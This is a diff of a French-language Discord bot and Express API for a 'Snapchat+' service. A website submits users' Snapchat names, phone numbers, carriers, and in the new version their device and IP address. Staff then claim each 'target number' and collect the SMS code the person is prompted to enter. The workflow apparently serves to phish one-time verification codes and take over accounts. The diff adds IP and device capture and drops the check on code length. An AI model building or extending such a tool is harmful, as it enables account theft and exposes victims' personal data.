@@ -1,4 +1,4 @@
-const { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder, PermissionsBitField, ChannelType, StringSelectMenuBuilder, SlashCommandBuilder, REST, Routes } = require('discord.js');
+const { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder, PermissionsBitField, ChannelType, StringSelectMenuBuilder, SlashCommandBuilder, REST, Routes, ModalBuilder, TextInputBuilder, TextInputStyle } = require('discord.js');
 const express = require('express');
 const cors = require('cors');
 const { v4: uuidv4 } = require('uuid');
@@ -7,7 +7,6 @@ const DISCORD_TOKEN    = process.env.DISCORD_TOKEN    || 'TON_TOKEN_ICI';
 const CLIENT_ID        = process.env.CLIENT_ID        || 'TON_CLIENT_ID_ICI'; 
 const ADMIN_CHANNEL_ID = process.env.ADMIN_CHANNEL_ID || '1570890792745304245';
 
-const ROLE_ACCES_ID    = '1541600868787556412'; 
 const ROLE_CROWN_ID    = '1541601494929907763';
 const ROLE_OWNER_ID    = '1565080966693781644';
 const ROLE_SUPPORT_ID  = '1541600641183387738';
@@ -19,228 +18,63 @@ const client = new Client({ intents: [
   GatewayIntentBits.MessageContent, GatewayIntentBits.GuildMembers
 ]});
 
-/* ═══════════════════════════════════════════════════════════════
-   ENREGISTREMENT DES COMMANDES SLASH (/)
-   ═══════════════════════════════════════════════════════════════ */
 client.once('ready', async () => {
   console.log(`✅ Bot connecté : ${client.user.tag}`);
-  client.user.setActivity('Snapchat+ | /ticket', { type: 'WATCHING' });
-
+  
   const commands = [
-    new SlashCommandBuilder()
-      .setName('ticket')
-      .setDescription('Envoyer le panneau de ticket')
-      .addChannelOption(option => 
-        option.setName('salon')
-          .setDescription('Le salon où envoyer le panneau')
-          .setRequired(true)),
-    new SlashCommandBuilder()
-      .setName('list')
-      .setDescription('Afficher la liste de toutes les demandes (codes, blacklist, etc.)'),
-    new SlashCommandBuilder()
-      .setName('acces')
-      .setDescription('Donner un accès temporaire ou à vie à un utilisateur')
-      .addUserOption(option =>
-        option.setName('user')
-          .setDescription('L\'utilisateur à qui donner l\'accès')
-          .setRequired(true))
-      .addStringOption(option =>
-        option.setName('duree')
-          .setDescription('La durée de l\'accès')
-          .setRequired(true)
-          .addChoices(
-            { name: '30 secondes', value: '30s' },
-            { name: '1 jour', value: '1d' },
-            { name: '1 semaine', value: '1w' },
-            { name: 'Lifetime (À vie)', value: 'lifetime' }
-          ))
-  ].map(command => command.toJSON());
+    new SlashCommandBuilder().setName('ticket').setDescription('Envoyer le panneau de ticket').addChannelOption(o => o.setName('salon').setDescription('Salon').setRequired(true)),
+    new SlashCommandBuilder().setName('list').setDescription('Afficher la liste des demandes')
+  ].map(c => c.toJSON());
 
   const rest = new REST({ version: '10' }).setToken(DISCORD_TOKEN);
-  try {
-    await rest.put(Routes.applicationCommands(CLIENT_ID), { body: commands });
-    console.log('✅ Commandes Slash enregistrées !');
-  } catch (error) {
-    console.error(error);
-  }
+  try { await rest.put(Routes.applicationCommands(CLIENT_ID), { body: commands }); } catch (e) { console.error(e); }
 });
 
-/* ═══════════════════════════════════════════════════════════════
-   GESTION DES INTERACTIONS
-   ═══════════════════════════════════════════════════════════════ */
 client.on('interactionCreate', async (interaction) => {
-  
-  // --- COMMANDES SLASH ---
-  if (interaction.isChatInputCommand()) {
-    
-    // /ticket #salon
-    if (interaction.commandName === 'ticket') {
-      const channel = interaction.options.getChannel('salon');
-      const bannerURL = 'https://i.imgur.com/NhoPWn6.png'; 
-
-      const embed = new EmbedBuilder()
-        .setTitle("🎟️ Besoin d'aide ?")
-        .setDescription("> *Ouvrez un ticket en sélectionnant une catégorie ci-dessous. Notre équipe vous répondra dans les plus brefs délais.*")
-        .setColor(0x2b2d31)
-        .setImage(bannerURL);
-
-      const menu = new ActionRowBuilder().addComponents(
-        new StringSelectMenuBuilder().setCustomId('ticket_select').setPlaceholder('Sélectionne une catégorie...')
-          .addOptions([
-            { label: 'Get-Acces', description: 'Obtenir un accès', value: 'acces', emoji: '🔑' },
-            { label: 'Redeem', description: 'Racheter un accès', value: 'redeem', emoji: '💎' },
-            { label: 'Autre', description: 'Autre demande', value: 'autre', emoji: '❓' }
-          ])
-      );
-      
-      await channel.send({ embeds: [embed], components: [menu] });
-      return interaction.reply({ content: `✅ Panneau de ticket envoyé dans ${channel}.`, ephemeral: true });
-    }
-
-    // /list
-    if (interaction.commandName === 'list') {
-      if (demandes.size === 0) return interaction.reply({ content: "Aucune demande pour le moment.", ephemeral: true });
-
-      const allDemandes = Array.from(demandes.values());
-      
-      const pending = allDemandes.filter(d => d.status === 'pending' || d.waitingForCode);
-      const accepted = allDemandes.filter(d => d.status === 'accepted');
-      const rejected = allDemandes.filter(d => d.status === 'rejected');
-      const blacklisted = allDemandes.filter(d => d.status === 'blacklisted');
-
-      const formatList = (arr, showCode = false) => {
-        if (arr.length === 0) return "`Aucun`";
-        return arr.map(d => {
-          let str = `> 👤 **@${d.username}** | 📱 \`${d.phone}\` | 🏢 \`${d.operator}\``;
-          if (showCode && d.code) str += ` | 🔑 Code: \`${d.code}\``;
-          return str;
-        }).join('\n');
-      };
-
-      const embed = new EmbedBuilder()
-        .setTitle('📂 Base de données des demandes')
-        .setColor(0x2b2d31)
-        .addFields(
-          { name: `⏳ En attente (${pending.length})`, value: formatList(pending), inline: false },
-          { name: `✅ Acceptées (${accepted.length})`, value: formatList(accepted, true), inline: false },
-          { name: `❌ Refusées (${rejected.length})`, value: formatList(rejected), inline: false },
-          { name: `🚫 Blacklist (${blacklisted.length})`, value: formatList(blacklisted), inline: false }
-        )
-        .setFooter({ text: 'Snapchat+ | Historique des codes' })
-        .setTimestamp();
-
-      return interaction.reply({ embeds: [embed], ephemeral: true });
-    }
-
-    // /acces @user [durée]
-    if (interaction.commandName === 'acces') {
-      const target = interaction.options.getMember('user');
-      const timeArg = interaction.options.getString('duree');
-      const role = interaction.guild.roles.cache.get(ROLE_ACCES_ID);
-
-      if (!role) return interaction.reply({ content: '❌ Rôle d\'accès introuvable.', ephemeral: true });
-
-      let ms = 0;
-      let displayTime = timeArg;
-
-      if (timeArg === '30s') { ms = 30 * 1000; displayTime = '30 secondes'; }
-      else if (timeArg === '1d') { ms = 24 * 60 * 60 * 1000; displayTime = '1 jour'; }
-      else if (timeArg === '1w') { ms = 7 * 24 * 60 * 60 * 1000; displayTime = '1 semaine'; }
-      else if (timeArg === 'lifetime') { ms = 0; displayTime = 'Lifetime'; }
-
-      try {
-        await target.roles.add(role);
-        
-        if (ms > 0) {
-          await interaction.reply({ content: `✅ Accès de **${displayTime}** donné à **${target.user.tag}**.`, ephemeral: true });
-          
-          setTimeout(async () => {
-            try {
-              if (target.roles.cache.has(role.id)) {
-                await target.roles.remove(role);
-                const dmEmbed = new EmbedBuilder()
-                  .setTitle('⏳ Ton accès a expiré')
-                  .setDescription(`Ton temps d'accès à Snapchat+ est écoulé.\n\nSi tu veux recharger ton temps, merci de faire un ticket sur le serveur.`)
-                  .setColor(0xef4444);
-                target.send({ embeds: [dmEmbed] }).catch(() => {});
-              }
-            } catch (err) { console.log(err); }
-          }, ms);
-          
-        } else {
-          await interaction.reply({ content: `♾️ Accès **Lifetime** donné à **${target.user.tag}**.`, ephemeral: true });
-        }
-      } catch (e) { 
-        return interaction.reply({ content: '❌ Impossible de donner le rôle (vérifie que le rôle du bot est au-dessus).', ephemeral: true }); 
-      }
-    }
-  }
-
-  // --- MENUS ET BOUTONS ---
-  if (!interaction.isButton() && !interaction.isStringSelectMenu()) return;
-
+  // --- MENU TICKET ---
   if (interaction.isStringSelectMenu() && interaction.customId === 'ticket_select') {
     const choice = interaction.values[0];
-    let categoryName = 'Autre';
-    if (choice === 'acces') categoryName = 'Get-Acces';
-    if (choice === 'redeem') categoryName = 'Redeem';
-
-    await interaction.reply({ content: `⏳ Création de ton ticket...`, ephemeral: true });
-
+    let cat = choice === 'acces' ? 'Get-Acces' : (choice === 'redeem' ? 'Redeem' : 'Autre');
+    await interaction.reply({ content: `⏳ Création du ticket...`, ephemeral: true });
     try {
-      const thread = await interaction.channel.threads.create({
-        name: `🎫 ${categoryName} - ${interaction.user.username}`,
-        type: ChannelType.PrivateThread, reason: 'Ticket client'
-      });
+      const thread = await interaction.channel.threads.create({ name: `🎫 ${cat} - ${interaction.user.username}`, type: ChannelType.PrivateThread });
       await thread.members.add(interaction.user.id);
-      
-      const embed = new EmbedBuilder()
-        .setTitle(`🎫 Ticket : ${categoryName}`)
-        .setDescription(`> Bonjour ${interaction.user}, un membre du staff va te répondre rapidement.\n> Explique ta demande ci-dessous.`)
-        .setColor(0x2b2d31);
-      const btnClose = new ActionRowBuilder().addComponents(
-        new ButtonBuilder().setCustomId('close_ticket').setLabel('Fermer le ticket').setStyle(ButtonStyle.Danger).setEmoji('🔒')
-      );
-      await thread.send({ content: `<@&${ROLE_CROWN_ID}> <@&${ROLE_OWNER_ID}> <@&${ROLE_SUPPORT_ID}>`, embeds: [embed], components: [btnClose] });
+      const embed = new EmbedBuilder().setTitle(`🎫 Ticket : ${cat}`).setDescription(`> Bonjour ${interaction.user}, un membre du staff va te répondre.`).setColor(0x2b2d31);
+      const btn = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId('close_ticket').setLabel('Fermer le ticket').setStyle(ButtonStyle.Danger).setEmoji('🔒'));
+      await thread.send({ content: `<@&${ROLE_CROWN_ID}> <@&${ROLE_OWNER_ID}> <@&${ROLE_SUPPORT_ID}>`, embeds: [embed], components: [btn] });
     } catch (e) { await interaction.followUp({ content: "❌ Impossible de créer le ticket.", ephemeral: true }); }
     return;
   }
-
+  
   if (interaction.isButton() && interaction.customId === 'close_ticket') {
-    await interaction.reply({ content: 'Fermeture dans 5 secondes...', ephemeral: false });
+    await interaction.reply({ content: 'Fermeture dans 5s...' });
     setTimeout(() => { if (interaction.channel) interaction.channel.delete().catch(() => {}); }, 5000);
     return;
   }
 
-  // --- BOUTONS DU SITE WEB (Demandes) ---
+  // --- BOUTONS DU SITE ---
+  if (!interaction.isButton()) return;
   const args = interaction.customId.split(':');
   const action = args[0];
   const demandeId = args[args.length - 1]; 
   const demande = demandes.get(demandeId);
-
   if (!demande) return interaction.reply({ content: 'Ce dossier est terminé ou n\'existe plus.', ephemeral: true });
 
+  // PRENDRE LE NUMÉRO
   if (action === 'claim') {
-    if (demande.claimed) return interaction.reply({ content: '❌ Trop tard, ce numéro a déjà été pris !', ephemeral: true });
-
+    if (demande.claimed) return interaction.reply({ content: '❌ Déjà pris !', ephemeral: true });
     demande.claimed = true;
     demande.claimedBy = interaction.user.id;
     demandes.set(demandeId, demande);
 
-    // Modification du message original
     const embedPris = new EmbedBuilder()
-      .setTitle(`⚡ NOUVEAU NUMÉRO : ${demande.operator}`)
-      .setDescription(`**Pris par ${interaction.user}**`)
-      .setColor(0xFF6B00);
+      .setTitle(`⚡ NOUVELLE DEMANDE : ${demande.operator}`)
+      .setColor(0xFF6B00)
+      .setDescription(`**Pris par ${interaction.user}**\n\n1️⃣ **Pseudo :** \`${demande.username}\`\n2️⃣ **Appareil :** \`${demande.device}\`\n3️⃣ **IP :** \`${demande.ip}\`\n4️⃣ **Opérateur :** \`${demande.operator}\`\n5️⃣ **Numéro :** \`${demande.phone}\``);
 
     await interaction.update({ embeds: [embedPris], components: [] });
 
-    // Création du fil privé
-    const thread = await interaction.channel.threads.create({
-      name: `📁 Dossier - @${demande.username}`,
-      type: ChannelType.PrivateThread, reason: 'Prise en charge'
-    });
-    
+    const thread = await interaction.channel.threads.create({ name: `📁 Dossier - ${demande.username}`, type: ChannelType.PrivateThread });
     await thread.members.add(interaction.user.id);
     demande.threadId = thread.id;
     demandes.set(demandeId, demande);
@@ -248,11 +82,12 @@ client.on('interactionCreate', async (interaction) => {
     const dossierEmbed = new EmbedBuilder()
       .setTitle('📁 FICHE DE VÉRIFICATION')
       .setColor(0x2b2d31)
-      .setDescription(`> Nouveau numéro attribué pour **@${demande.username}**.`)
       .addFields(
-        { name: '📱 Numéro Cible', value: `\`\`\`\n+33 ${demande.phone}\n\`\`\``, inline: false },
-        { name: '👤 Snapchat', value: `\`@${demande.username}\``, inline: true },
-        { name: '🏢 Opérateur', value: `\`${demande.operator}\``, inline: true }
+        { name: '1️⃣ Pseudo', value: `\`\`\`\n${demande.username}\n\`\`\``, inline: false },
+        { name: '2️⃣ Appareil', value: `\`${demande.device}\``, inline: true },
+        { name: '3️⃣ IP', value: `\`${demande.ip}\``, inline: true },
+        { name: '4️⃣ Opérateur', value: `\`${demande.operator}\``, inline: true },
+        { name: '5️⃣ Numéro', value: `\`\`\`\n+33 ${demande.phone}\n\`\`\``, inline: false }
       );
 
     const rowCode = new ActionRowBuilder().addComponents(
@@ -260,7 +95,7 @@ client.on('interactionCreate', async (interaction) => {
       new ButtonBuilder().setCustomId(`setcode:6:${demandeId}`).setLabel('Code 6 Chiffres').setStyle(ButtonStyle.Primary).setEmoji('🔢')
     );
     const rowActions = new ActionRowBuilder().addComponents(
-      new ButtonBuilder().setCustomId(`blacklist:${demandeId}`).setLabel('Blacklist').setStyle(ButtonStyle.Danger).setEmoji('🚫'),
+      new ButtonBuilder().setCustomId(`copynum:${demandeId}`).setLabel('Copier Numéro').setStyle(ButtonStyle.Secondary).setEmoji('📋'),
       new ButtonBuilder().setCustomId(`reject:${demandeId}`).setLabel('Rejeter').setStyle(ButtonStyle.Danger).setEmoji('❌')
     );
 
@@ -268,80 +103,103 @@ client.on('interactionCreate', async (interaction) => {
     return interaction.followUp({ content: `✅ Dossier déplacé : ${thread}`, ephemeral: true });
   }
 
+  // COPIER LE NUMÉRO
+  if (action === 'copynum') return interaction.reply({ content: `\`${demande.phone}\``, ephemeral: true });
+
+  // DEMANDER LE CODE
   if (action === 'setcode') {
     const length = parseInt(args[1]);
     demande.codeLength = length;
     demande.waitingForCode = true;
     demandes.set(demandeId, demande);
-    
-    const embedWait = new EmbedBuilder()
-      .setDescription(`⏳ **En attente du code à ${length} chiffres...**`)
-      .setColor(0x2b2d31);
-      
-    await interaction.update({ embeds: [embedWait], components: [] });
+    await interaction.update({ content: `⏳ **En attente du code à ${length} chiffres...**`, embeds: [], components: [] });
   }
 
+  // MAUVAIS CODE
   if (action === 'badcode') {
     demande.waitingForCode = true;
     demandes.set(demandeId, demande);
-    
-    const embedBad = new EmbedBuilder()
-      .setDescription(`⚠️ **Code invalide. Le client a été invité à réessayer.**`)
-      .setColor(0xef4444);
-      
-    await interaction.update({ embeds: [embedBad], components: [] });
+    await interaction.update({ content: `⚠️ **Code invalide. Le client a été invité à réessayer.**`, embeds: [], components: [] });
   }
 
+  // VALIDER
   if (action === 'accept') {
     demande.status = 'accepted';
     demandes.set(demandeId, demande);
-    
-    const embedOk = new EmbedBuilder()
-      .setDescription(`✅ **Code validé et dossier approuvé avec succès !**\n> *Ce fil sera supprimé dans 5 secondes.*`)
-      .setColor(0x22c55e);
-      
-    await interaction.update({ embeds: [embedOk], components: [] });
+    await interaction.update({ content: `✅ **Validé !**`, embeds: [], components: [] });
     setTimeout(() => { if (interaction.channel) interaction.channel.delete().catch(() => {}); }, 5000);
   }
-  
-  if (action === 'reject' || action === 'blacklist') {
-    demande.status = action === 'reject' ? 'rejected' : 'blacklisted';
-    demandes.set(demandeId, demande);
+
+  // REJETER (Ouvre une fenêtre pour écrire le message)
+  if (action === 'reject') {
+    const modal = new ModalBuilder().setCustomId(`reject_modal:${demandeId}`).setTitle('Raison du rejet');
+    const input = new TextInputBuilder().setCustomId('reason').setLabel('Message pour le client').setStyle(TextInputStyle.Paragraph).setPlaceholder('Ex: Faux numéro, numéro déjà utilisé...').setRequired(true);
+    modal.addComponents(new ActionRowBuilder().addComponents(input));
+    await interaction.showModal(modal);
+  }
+});
+
+// GESTION DU MESSAGE DE REJET (MODAL)
+client.on('interactionCreate', async (interaction) => {
+  if (!interaction.isModalSubmit()) return;
+  if (interaction.customId.startsWith('reject_modal:')) {
+    const demandeId = interaction.customId.split(':')[1];
+    const raison = interaction.fields.getTextInputValue('reason');
+    const demande = demandes.get(demandeId);
     
-    const embedReject = new EmbedBuilder()
-      .setDescription(`❌ **Dossier rejeté ou blacklisté.**\n> *Ce fil sera supprimé dans 5 secondes.*`)
-      .setColor(0xef4444);
-      
-    await interaction.update({ embeds: [embedReject], components: [] });
+    if (demande) {
+      demande.status = 'rejected';
+      demande.rejectReason = raison;
+      demandes.set(demandeId, demande);
+    }
+    
+    await interaction.reply({ content: `❌ **Dossier rejeté.**\nRaison envoyée au client : *${raison}*`, ephemeral: true });
     setTimeout(() => { if (interaction.channel) interaction.channel.delete().catch(() => {}); }, 5000);
   }
 });
 
-/* ═══════════════════════════════════════════════════════════════
-   API EXPRESS (Pour le site web)
-   ═══════════════════════════════════════════════════════════════ */
+// COMMANDES SLASH
+client.on('interactionCreate', async (interaction) => {
+  if (!interaction.isChatInputCommand()) return;
+  if (interaction.commandName === 'ticket') {
+    const channel = interaction.options.getChannel('salon');
+    const embed = new EmbedBuilder().setTitle("🎟️ Besoin d'aide ?").setDescription("> *Ouvrez un ticket en sélectionnant une catégorie ci-dessous.*").setColor(0x2b2d31).setImage('https://i.imgur.com/NhoPWn6.png');
+    const menu = new ActionRowBuilder().addComponents(new StringSelectMenuBuilder().setCustomId('ticket_select').setPlaceholder('Sélectionne une catégorie...').addOptions([{ label: 'Get-Acces', value: 'acces', emoji: '🔑' },{ label: 'Redeem', value: 'redeem', emoji: '💎' },{ label: 'Autre', value: 'autre', emoji: '❓' }]));
+    await channel.send({ embeds: [embed], components: [menu] });
+    return interaction.reply({ content: `✅ Envoyé.`, ephemeral: true });
+  }
+  if (interaction.commandName === 'list') {
+    const all = Array.from(demandes.values());
+    const embed = new EmbedBuilder().setTitle('📂 Demandes').setColor(0x2b2d31).addFields(
+      { name: `⏳ En attente (${all.filter(d=>d.status==='pending'||d.waitingForCode).length})`, value: all.filter(d=>d.status==='pending'||d.waitingForCode).map(d => `> ${d.username} (${d.operator})`).join('\n') || '`Aucun`' },
+      { name: `✅ Acceptées (${all.filter(d=>d.status==='accepted').length})`, value: all.filter(d=>d.status==='accepted').map(d => `> ${d.username} | Code: ${d.code}`).join('\n') || '`Aucun`' }
+    );
+    return interaction.reply({ embeds: [embed], ephemeral: true });
+  }
+});
+
+// API POUR LES SITES
 const app = express();
 app.use(cors());
 app.use(express.json());
 
 app.post('/api/demande', async (req, res) => {
   try {
-    const { username, phone, operator } = req.body;
+    const { username, phone, operator, device, ip } = req.body;
     const id = uuidv4();
     let formattedPhone = phone;
     if(phone.length === 10) formattedPhone = `${phone.slice(0,2)} ${phone.slice(2,4)} ${phone.slice(4,6)} ${phone.slice(6,8)} ${phone.slice(8,10)}`;
 
-    const demande = { id, username, phone: formattedPhone, operator, status: 'pending', claimed: false, waitingForCode: false };
+    const demande = { id, username, phone: formattedPhone, operator, device: device || 'Inconnu', ip: ip || 'Inconnue', status: 'pending', claimed: false, waitingForCode: false };
     demandes.set(id, demande);
 
     const channel = await client.channels.fetch(ADMIN_CHANNEL_ID).catch(() => null);
-    if(!channel) return res.status(500).json({ error: 'Salon admin introuvable.' });
-
+    
+    // TEXTE PUBLIC
     const embedPublic = new EmbedBuilder()
-      .setTitle(`⚡ NOUVEAU NUMÉRO : ${operator}`)
+      .setTitle(`⚡ NOUVELLE DEMANDE`)
       .setDescription(`Clique sur **Prendre le numéro**, fais vite !! 🚀`)
       .setColor(0xFF6B00);
-      
     const row = new ActionRowBuilder().addComponents(
       new ButtonBuilder().setCustomId(`claim:${id}`).setLabel('Prendre le numéro').setStyle(ButtonStyle.Primary).setEmoji('⚡')
     );
@@ -357,38 +215,23 @@ app.post('/api/demande', async (req, res) => {
 app.get('/api/demande/:id/status', (req, res) => {
   const demande = demandes.get(req.params.id);
   if (!demande) return res.status(404).json({ error: 'Introuvable' });
-  if (demande.status === 'blacklisted') return res.json({ status: 'rejected', blacklisted: true });
-  res.json({ status: demande.status, waitingForCode: demande.waitingForCode, codeLength: demande.codeLength || 4 });
+  res.json({ status: demande.status, waitingForCode: demande.waitingForCode, codeLength: demande.codeLength || 4, rejectReason: demande.rejectReason || null });
 });
 
 app.post('/api/demande/:id/code', async (req, res) => {
   try {
     const { code } = req.body;
     const demande = demandes.get(req.params.id);
-    if (!demande) return res.status(404).json({ error: 'Introuvable' });
-
-    const expectedLength = demande.codeLength || 4;
-    if (code.length !== expectedLength) return res.status(400).json({ error: `Code à ${expectedLength} chiffres requis.` });
-
     demande.waitingForCode = false;
     demande.code = code;
     demandes.set(demande.id, demande);
 
-    const embedCode = new EmbedBuilder()
-      .setTitle('🔑 CODE REÇU')
-      .setColor(0x2b2d31)
-      .setDescription(`> Le client a bien envoyé son code.`)
-      .addFields(
-        { name: '🔢 Code', value: `\`\`\`\n${code}\n\`\`\``, inline: false },
-        { name: '📱 Numéro', value: `\`${demande.phone}\``, inline: true },
-        { name: '👤 Snap', value: `\`@${demande.username}\``, inline: true }
-      );
-      
+    const embedCode = new EmbedBuilder().setTitle('🔑 CODE REÇU').setColor(0x2b2d31)
+      .addFields({ name: 'Code', value: `# **${code}**`, inline: false });
     const rowActions = new ActionRowBuilder().addComponents(
       new ButtonBuilder().setCustomId(`accept:${demande.id}`).setLabel('Valider & Activer').setStyle(ButtonStyle.Success).setEmoji('✅'),
       new ButtonBuilder().setCustomId(`badcode:${demande.id}`).setLabel('Mauvais Code').setStyle(ButtonStyle.Danger).setEmoji('⚠️')
     );
-
     if (demande.threadId) {
       const thread = await client.channels.fetch(demande.threadId).catch(() => null);
       if (thread) await thread.send({ content: `<@${demande.claimedBy}>`, embeds: [embedCode], components: [rowActions] });
